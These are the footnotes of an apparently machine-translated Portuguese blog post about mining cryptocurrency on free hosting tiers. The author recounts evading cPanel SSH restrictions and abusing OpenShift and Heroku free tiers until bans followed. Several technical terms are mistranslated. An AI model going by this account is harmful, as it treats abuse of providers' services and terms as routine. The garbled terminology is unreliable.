diferentes em portas de conexão diferentes e tendem a alinhar a dificuldade do trabalho aos compartilhamentos enviados pelo minerador, mas a granularidade do proxy era ainda mais conveniente, pois impediria o pool<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> aprisionamento</a> (embora nunca tenhamos realmente mudado de piscina).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>não ficou feliz quando a configuração apareceu de repente e desapareceu do sistema de arquivos</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Nós não falamos sobre o<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protocolo de estrato</a> já que só temos que lidar com tudo o que está implementado em<em> Ambas</em> a piscina e o minerador ... que geralmente é o mínimo necessário e, possivelmente, com extensões não padronizadas.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>nunca vá para a festa completa :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Não explorei o que acontece quando um processo carrega funcionalidade adicional em tempo de execução, já que o kernel procuraria o endereço no layout de memória do executável, o que acessaria o sistema de arquivos e possivelmente causaria um travamento.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Os limites são arbitrários, o tempo da CPU é inferior a um segundo, a memória é inferior a 128M, as conexões de saída estão bloqueadas.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>com um pouco de paciência, você também pode executar uma instância ssh completa em um ambiente inicializado em torno de seu espaço de conta cpanel,<em> sem</em> ter acesso ao SSH integrado do cpanel, que tende a ser desabilitado pelos provedores de hospedagem.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>O openshift passou de um nível gratuito de 1 ano para 3 meses para 1 mês, começando a exigir autenticação por telefone, posso garantir que não fui o único a abusar de seus serviços.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Os contêineres de nível livre do Heroku são bastante generosos em recursos, eles fornecem cpus 4c / 8t (virtual), bastante memória RAM e grande armazenamento (que, entretanto, não é persistente e é descartado no desligamento do dinamômetro).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Eles adotam regras de registro muito mais rígidas. Depois de algumas proibições, posso ter contribuído para isso.</table><p><div class=page-foot><div class=copyright></div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Desenvolvido por<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/pt/sitemapxml> Mapa do site</a></li> | <li><a href=/pt/tag> Tag</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>